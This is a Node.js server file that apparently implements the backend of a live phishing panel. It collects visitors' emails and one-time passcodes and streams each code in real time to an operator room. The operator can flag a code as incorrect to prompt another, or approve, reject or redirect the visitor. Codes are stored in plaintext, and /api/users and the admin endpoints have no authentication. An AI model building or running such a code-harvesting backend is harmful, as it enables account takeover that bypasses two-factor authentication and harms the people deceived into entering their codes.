require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { Pool } = require('pg');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*" }
});

app.use(express.json());
app.use(express.static('public'));

// Neon PostgreSQL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Create table
async function initDatabase() {
  const createTableQuery = `
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      email VARCHAR(255) UNIQUE NOT NULL,
      otp_code VARCHAR(10),
      status VARCHAR(50) DEFAULT 'pending',
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
  `;
  await pool.query(createTableQuery);
  console.log('✅ Database ready');
}
initDatabase();

// Store user sockets
const userSockets = new Map();

io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  socket.on('user-join', (email) => {
    userSockets.set(email, socket.id);
    socket.join(`user_${email}`);
    console.log(`User ${email} joined`);
  });

  socket.on('admin-join', () => {
    socket.join('admin_room');
    console.log('Admin joined');
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected');
  });
});

// Submit email
app.post('/api/submit-email', async (req, res) => {
  const { email } = req.body;
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ error: 'Invalid email' });
  }

  try {
    let result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
    let userId;

    if (result.rows.length === 0) {
      const insert = await pool.query(
        'INSERT INTO users (email, status) VALUES ($1, $2) RETURNING id',
        [email, 'pending']
      );
      userId = insert.rows[0].id;
    } else {
      userId = result.rows[0].id;
      await pool.query('UPDATE users SET status = $1, otp_code = NULL WHERE email = $2', ['pending', email]);
    }

    // Notify admin
    io.to('admin_room').emit('new-email', { email, userId, timestamp: new Date() });

    res.json({ success: true, userId });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error' });
  }
});

// Submit OTP
app.post('/api/submit-otp', async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) return res.status(400).json({ error: 'Missing data' });

  try {
    await pool.query(
      'UPDATE users SET otp_code = $1, status = $2 WHERE email = $3',
      [otp, 'otp_submitted', email]
    );

    io.to('admin_room').emit('new-otp', { email, otp, timestamp: new Date() });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error' });
  }
});

// Get all users
app.get('/api/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, email, otp_code, status, created_at FROM users ORDER BY created_at DESC');
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin login
app.post('/api/admin/check', (req, res) => {
  const { email, password } = req.body;
  const adminEmail = process.env.ADMIN_EMAIL;
  const adminPass = process.env.ADMIN_PASSWORD;
  if (email === adminEmail && password === adminPass) {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

// Admin actions
app.post('/api/admin/approve', async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['approved', email]);
  io.to(`user_${email}`).emit('approve-user', { email });
  res.json({ success: true });
});

app.post('/api/admin/reject', async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['rejected', email]);
  io.to(`user_${email}`).emit('reject-user', { email });
  res.json({ success: true });
});

app.post('/api/admin/incorrect-otp', async (req, res) => {
  const { email } = req.body;
  io.to(`user_${email}`).emit('incorrect-otp', { email });
  res.json({ success: true });
});

app.post('/api/admin/redirect', async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['redirected', email]);
  io.to(`user_${email}`).emit('redirect-to-sad', { email });
  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Admin: http://localhost:${PORT}/admin.html`);
});
